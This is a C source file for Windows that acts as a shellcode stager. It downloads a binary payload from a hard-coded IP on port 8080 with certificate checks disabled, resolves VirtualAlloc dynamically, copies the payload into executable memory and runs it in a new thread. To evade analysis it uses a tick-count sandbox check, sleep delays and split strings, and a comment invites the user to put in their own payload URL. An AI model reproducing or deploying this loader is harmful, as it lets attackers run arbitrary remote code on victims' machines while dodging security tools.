#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wininet.h>


#pragma comment(lib, "wininet.lib")

typedef LPVOID (WINAPI* vaex)(
  LPVOID,
  SIZE_T,
  DWORD,
  DWORD  
);


int main(){

    if(1==1){

        
        HINTERNET hInternet = NULL, hUrlFile = NULL;
        BYTE buffer[1024];
        DWORD bytesRead;
        BYTE *coder = NULL;
        DWORD totalBytes = 0;
        DWORD tickCount = GetTickCount();
    
if (tickCount > 40000) {

          // Initialize WinINet
        char url[100]; // Ensure this is large enough to hold the final string
        strcpy(url, "http://192.168.147");
        strcat(url, ".128:8080/");
        strcat(url, "DIFFICULT_BEHAVIOR.bin");// Replace with your URL to payload
        hInternet = InternetOpen("WinINetExample", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
          if (!hInternet) {
               printf("InternetOpen failed. Error: %lu\n", GetLastError());
          }

        hUrlFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
, 0);
          if (!hUrlFile) {
             printf("InternetOpenUrl failed. Error: %lu\n", GetLastError());
             InternetCloseHandle(hInternet);
          }

        while (InternetReadFile(hUrlFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        BYTE *temp = realloc(coder, totalBytes + bytesRead);
        if (!temp) {
            printf("Memory allocation failed.\n");
            free(coder);
            InternetCloseHandle(hUrlFile);
            InternetCloseHandle(hInternet);
        }
        coder = temp;
        
        memcpy(coder + totalBytes, buffer, bytesRead);
        totalBytes += bytesRead;
            }
  
    InternetCloseHandle(hUrlFile);
    InternetCloseHandle(hInternet);
        char c[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
         HMODULE hKernel32 = LoadLibraryA(c);
         Sleep(5000);
            int j= 0;
            vaex alloc =(vaex)GetProcAddress(hKernel32,"VirtualAlloc");
            LPVOID alloc_mem = alloc(NULL, totalBytes, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            printf("Error2: %lu\n", GetLastError());
            memcpy(alloc_mem, coder, totalBytes);
            printf("Error3: %lu\n", GetLastError());
            free(coder);
            Sleep(5000);
             HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
            if (!hThread) {
                  printf("CreateThread failed: %lu\n", GetLastError());
                  VirtualFree(alloc_mem, 0, MEM_RELEASE); 
                return 0;
             }
             WaitForSingleObject(hThread, INFINITE);

            CloseHandle(hThread);
            VirtualFree(alloc_mem, 0, MEM_RELEASE); 
            printf("Error4: %lu\n", GetLastError());
            Sleep(5000);
            return 0;
         }
    else{
       return 0;
    }
 
}
}
